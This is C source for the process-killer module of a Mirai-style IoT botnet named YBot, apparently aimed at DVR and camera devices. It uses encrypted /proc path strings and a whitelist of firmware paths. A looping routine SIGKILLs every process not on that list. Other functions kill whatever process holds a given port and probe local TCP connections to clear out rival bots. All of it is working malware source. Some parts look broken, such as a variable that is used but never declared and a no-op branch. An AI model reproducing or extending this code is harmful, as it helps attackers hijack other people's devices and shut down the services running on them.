#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#include "headers/util.h"
#include "headers/enc.h"
#include "headers/dirent.h"
#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/table.h"

#define KILLER_DO_CMDLINE 1 // 1 = on, 0 = off.
#define KILLER_INSTANCE 1 // 1 = on, 0 = off.
#define KILLER_DO_ARCH_EXTENSION 1 // 1 = on, 0 = off.
#define KILLER_EXE 1
#define KILLER_MAPS 2
#define KILLER_REALPATH 3
#define KILLER_RULES_AMOUNT 9


static uint8_t key[] = {0x39, 0x69, 0x28, 0x8F, 0xF9, 0xEF, 0xAA, 0x21, 0x5A, 0x9F, 0x89, 0x59, 0xAE, 0xFE, 0x35, 0xF4, 0xA1};
static uint8_t *proc = "\x30\x28\x18\xc5\xa5\x15\xe0\x94\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";
static uint8_t *maps = "\x6c\x7f\x1f\x70\xd9\xd4\x58\xe9\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";
static uint8_t *exe = "\xeb\xcc\xa\x30\x48\xa8\xa2\x4\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";
static uint8_t *cmdline = "\x96\x3c\x68\xd3\xf\xba\xf4\x60\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";
static uint8_t *proc_net_tcp = "\x2c\x1c\x98\xff\x61\x7f\x1a\xf8\x4c\x39\x1a\x35\xd\xe4\xa6\xbe\x75\x76\x38\xf3\x85\x3d\x7d\xb\x0\x0\x0\x0\x0\x0\x0\x0";
static uint8_t *local_bind = "\x30\x25\xd7\xdd\x4d\xfb\xb8\xf3\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";
static uint8_t *force_remote = "\x81\x89\x5e\x46\xdc\x98\x96\x7c\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";

int killer_pid = -1;
char remoteaddr[32];

static int killer_getpid(void)
{
    return killer_pid;
}
char *whitlistpaths[] = {
    "var/Challenge",
    "app/hi3511",
    "gmDVR",
    "ibox",
    "usr/dvr_main _8182T_1108",
    "mnt/mtd/app/gui",
    "var/Kylin",
    "l0 c/udevd",
    "anko-app/ankosample _8182T_1104",
    "var/tmp/sonia",
    "hicore",
    "stm_hi3511_dvr",
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "home/Davinci",
    "telnet",
    "ssh",
    "watchdog",
    "/var/spool",
    "/var/Sofia",
    "sshd",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "Ybot",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/"};

char check_self_path(char *real_path)
{
    int len;
    char self_path[64];

    if ((len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) == -1)
        return 1;

    self_path[len] = 0;

    if (!strcmp(real_path, self_path))
        return 0;

    return 1;
}

char check_safe_path(char *real_path)
{
    if (!check_self_path(real_path))
        return 1;
    for (unsigned int i = 0; i < sizeof(whitlistpaths) / sizeof(whitlistpaths[0]); i++)
        if (strstr(real_path, whitlistpaths[i]))
            return 1;
    return 0;
}
char check_real_path(char *pid)
{
    int len;
    char exe_path[20], real_path[64];

    strcpy(exe_path, "/proc/");
    strcat(exe_path, pid);
    strcat(exe_path, "/exe");

    if ((len = readlink(exe_path, real_path, sizeof(real_path) - 1)) == -1)
        return 1;
    real_path[len] = 0;
    if (!check_safe_path(real_path))
        return 0;
    return 1;
}
char duck_killer(void)
{
    DIR *dir;
    if ((dir = opendir("/proc/")) == NULL)
        return 0;
    struct dirent *file;

    while ((file = readdir(dir)))
    {
        if (*(file->d_name) < '0' || *(file->d_name) > '9')
            continue;
        if (!check_real_path(file->d_name))
        {
            kill(atoi(file->d_name), SIGKILL);
            printf("(YBot/Killer) >> KILLING PID: (%s)\n", file->d_name);
        }
    }
    closedir(dir);
    return 1;
}
void duck_killer_init(void)
{
    if (!fork())
    {
        while (1)
        {
            if (!duck_killer())
                break;
            usleep(20000);
        }
    }
}
BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("(YBot/Killer) >> Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);

    if (fd == -1) {
      return 0;
    }
    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);
    if (util_strlen(inode) == 0)
    {
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);
        return 0;
    }
    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
            if (*pid < '0' || *pid > '9')
                continue;
            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));
            if (readlink(path, exe, PATH_MAX) == -1)
                continue;
            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;
                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
    sleep(1);
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);
    return ret;
}

int killer_get_tcpconns(struct tcp_conns_t *tcp_conns, char *netfile)
{
    int fd_open, i = 0, line = 0, first = 1;
    char rdbuf[512], tmprdbuf[256], tmpbuf[1];

    if ((fd_open = open(netfile, O_RDONLY)) == -1)
        return 0;

    while (1)
    {
        char hexval[64];
        int end = 0, x = 0;

        while (read(fd_open, tmpbuf, 1) && *tmpbuf != '\n')
        {
            if (i == 0)
            {
                rdbuf[i] = *tmpbuf;
                i++;
            }
            else
                rdbuf[i++] = *tmpbuf;
        }

        if (first == 1)
        {
            first = 0;
            memset_(tmprdbuf, 0, sizeof(tmprdbuf)); memset_(rdbuf, 0, sizeof(rdbuf)); memset_(hexval, 0, sizeof(hexval));
            i = 0;
            continue;
        }

        if (line == TCP_CONNS_MAX)
        {
            memset_(tmprdbuf, 0, sizeof(tmprdbuf)); memset_(rdbuf, 0, sizeof(rdbuf)); memset_(hexval, 0, sizeof(hexval));
            i = 0;
            break;
        }

        if (rdbuf[4] != ':' &&  rdbuf[5] != ':')
        {
            memset_(tmprdbuf, 0, sizeof(tmprdbuf)); memset_(rdbuf, 0, sizeof(rdbuf)); memset_(hexval, 0, sizeof(hexval));
            i = 0;
            break;
        }

        if (rdbuf[4] == ':') // skip to remote host
            strcpy_(tmprdbuf, (rdbuf + 4) + 2 + 14);
        else
            strcpy_(tmprdbuf, (rdbuf + 5) + 2 + 14);

        memcpy_(hexval, tmprdbuf, 13);
        if (hexval[8] != ':') // format == XXXXXXXX:XXXX
        {
            memset_(tmprdbuf, 0, sizeof(tmprdbuf)); memset_(rdbuf, 0, sizeof(rdbuf)); memset_(hexval, 0, sizeof(hexval));
            i = 0;
            continue;
        }

        enc_switch(local_bind, key, ENC_DECRYPT);
        if (strstr_(hexval + 8, buffer) != NULL)
        {
            // local connection (could be mirai single instance)
            char tmphexval[64];

            if (rdbuf[4] == ':')
                strcpy_(rdbuf, (rdbuf + 4) + 2);
            else
                strcpy_(rdbuf, (rdbuf + 5) + 2);

            memcpy_(tmphexval, rdbuf, 13);
            strcpy_(tcp_conns[line].port, tmphexval + 9);
            line++; i = 0;
            memset_(tmphexval, 0, sizeof(tmphexval)); memset_(tmprdbuf, 0, sizeof(tmprdbuf)); memset_(rdbuf, 0, sizeof(rdbuf)); memset_(hexval, 0, sizeof(hexval));
            i = 0;
            continue;
        }
        memset_(tmprdbuf, 0, sizeof(tmprdbuf)); memset_(rdbuf, 0, sizeof(rdbuf)); memset_(hexval, 0, sizeof(hexval));
    }

    return line;
}

void killer_start(void)
{
    struct tcp_conns_t conns[TCP_CONNS_MAX];
    uint32_t parent;
    parent = fork();

    if (parent > 0)
    {
        killer_pid = parent;
        return;
    }
    else if (parent == -1)
        return;

    int loops = 0, do_scan = 1;

    reverse_string(remoteaddr);

    if (strlen_(remoteaddr) >= 13)
    {
        remoteaddr[0] = 'F'; remoteaddr[2] = 'R'; remoteaddr[4] = 'A'; remoteaddr[6] = 'N'; remoteaddr[8] = 'C'; remoteaddr[10] = 'O';
    }
    else
    {
        remoteaddr[0] = 'S'; remoteaddr[2] = 'K'; remoteaddr[4] = 'I'; remoteaddr[6] = 'D';
    }

    while(1)
    {
        if (loops == 100)
            loops = 0;

        sleep(1);

        if (loops++ % 5 == 0 && do_scan == 1)
        {
            DIR *dir;
            struct dirent *file;
#ifdef DEBUG
            printf("(YBot/Killer) >> killer running in kill by find buf mode\n");
#endif
            if ((dir = opendir("/proc/")) == NULL)
            {
#ifdef DEBUG
                printf("(YBot/Killer) >> failed to open /proc/\n");
#endif
                do_scan = 0;
                continue;
            }
            while ((file = readdir(dir)) != NULL)
            {
                if (*(file->d_name) < '0' || *(file->d_name) > '9')
                    continue;

                char exe_path[64], maps_path[64], cmdline_path[64], realpath[128];
                char status_path[64];
                int rp_len, fd, pid = atoi(file->d_name);

                strcpy_(exe_path, "/proc/"); strcat_(exe_path, file->d_name); strcat_(exe_path, "/exe");
                strcpy_(maps_path, "/proc/"); strcat_(maps_path, file->d_name); strcat_(maps_path, "/maps");
                strcpy_(cmdline_path, "/proc/"); strcat_(cmdline_path, file->d_name); strcat_(cmdline_path, "/cmdline");

                if ((rp_len = readlink(exe_path, realpath, sizeof(realpath))) != -1)
                {
                    realpath[rp_len] = 0;

                    if (pid == getpid() || pid == getppid() || pid == killer_getpid())
                        continue;

                    if (KILLER_DO_ARCH_EXTENSION == 1)
                    {
                    usleep(0000);                   
                    }
                }
                memset_(exe_path, 0, sizeof(exe_path)); memset_(exe_path, 0, sizeof(exe_path));
            }
            closedir(dir);
        }
        else
        {
            if (KILLER_INSTANCE == 1)
            {
                int conns_found = 0, i = 0;
    #ifdef DEBUG
                printf("(YBot/Killer) >> killer running in kill by port mode (%d, %s)\n", getpid(), remoteaddr);
    #endif
                enc_switch(proc_net_tcp, key, ENC_DECRYPT);
                conns_found = killer_get_tcpconns(conns, buffer);
                for (i = 0; i < conns_found; i++)
                {
                    int decimal, fd_socket, i = 0;
                    struct sockaddr_in addr;
                    decimal = hex_to_decimal(conns[i].port);
					if (decimal == SINGLE_INSTANCE_PORT || decimal == 39148)
                        continue;
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(decimal);
                    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
                    if ((fd_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        memset_(&addr, 0, sizeof(&addr));
                        continue;
                    }
                    if (connect(fd_socket, &addr, sizeof (struct sockaddr_in)) < 0)
                    {
                        close(fd_socket);
                        memset_(&addr, 0, sizeof(&addr));
                        continue;
                    }
                    close(fd_socket);
                    memset_(&addr, 0, sizeof(&addr));
                }
                memset_(conns, 0, sizeof(conns));
            }
        }
    sleep(2);
  }
}
void killer_stop(void)
{
    if (killer_pid != -1)
    {
        kill(killer_pid, 9);
        killer_pid = -1;
    }
}
